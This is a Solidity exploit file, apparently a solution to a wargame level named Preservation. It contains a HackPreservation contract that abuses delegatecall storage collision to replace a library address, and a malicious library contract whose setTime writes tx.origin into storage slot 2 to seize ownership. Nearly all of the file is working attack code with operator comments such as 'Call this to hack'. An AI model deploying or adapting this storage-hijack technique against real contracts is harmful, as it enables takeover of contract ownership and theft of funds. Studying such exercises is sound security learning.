// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

//////////////////////////////
// HACK CONTRACT
//////////////////////////////
contract HackPreservation {

    constructor() public {}

    //////////////////////
    // INTERNAL FUNCS
    //////////////////////
    function _setFirstTime(address _preservationContractAddr, uint256 _timestamp) internal returns (bool) {
        (bool success, ) = _preservationContractAddr.call(
            abi.encodeWithSignature(
                "setFirstTime(uint256)",
                _timestamp
            )
        );
        return success;
    }

    //////////////////////
    // FUNCTIONS
    //////////////////////

    /**
    * @notice Call this to hack the Preservation contract
    * @param _preservationContractAddr Address of the Preservation contract
    * @param _maliciousLibAddr Address of malicious library contract (must be deployed before this contract)
    */
    function hack(address _preservationContractAddr, address _maliciousLibAddr) external {
        // Stage 1 -> Overwrite `timeZone1Library` address in Preservation with our library
        uint256 payload = uint256(_maliciousLibAddr);
        _setFirstTime(_preservationContractAddr, payload);

        // Stage 2 -> Call `setFirstTime()` to invoke our library's function
        _setFirstTime(_preservationContractAddr, 0);
    }
}

//////////////////////////////
// OUR MALICIOUS CONTRACT
//////////////////////////////

contract LibraryMaliciousContract {

    /**
    * @dev This function will change owner to tx.origin (you) in Preservation contract. If it does not, view this contrac's transactions on etherscan. Sometimes, gas may run out!
    */
    function setTime(uint256) external {
        assembly {
            sstore(0x2, origin())
        }
    }
}